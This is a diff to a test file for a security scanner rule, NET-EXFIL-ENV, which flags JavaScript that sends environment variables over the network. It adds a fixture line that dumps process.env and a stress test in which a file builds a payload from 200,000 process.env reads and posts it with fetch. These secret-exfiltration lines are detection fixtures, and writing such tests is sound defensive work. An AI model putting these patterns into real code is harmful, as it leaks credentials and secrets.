@@ -346,6 +346,7 @@ describe('malicious fixture attack lines', () => {
         "socket.write(Object.values(process.env).join('\\n'));",
         'socket.write(util.inspect(process.env));',
         'const snapshot: Record<string, string | undefined> = { ...process.env };',
+        "${Object.entries(process.env).join('\\n')}`;",
       ],
     },
     {
@@ -971,5 +972,15 @@ describe('NET-EXFIL-ENV flow cost on hostile JavaScript', () => {
 
     expect(findings.map((finding) => finding.ruleId)).toEqual(['NET-EXFIL-ENV']);
     expect(elapsedMs).toBeLessThan(FLOW_BUDGET_MS);
+  });
+
+  it('should report a copy that holds 200,000 reads without a stack overflow', async () => {
+    const filePath = join(tmpDir, 'collect.js');
+    const copy = `const payload = [${'process.env,'.repeat(200_000)}]\n`;
+    await writeFile(filePath, `${copy}fetch(URL, { body: payload })\n`);
+
+    const findings = await runRules(filePath, [NET_EXFIL_ENV]);
+
+    expect(findings.map((finding) => finding.line)).toEqual([1]);
   });
 });
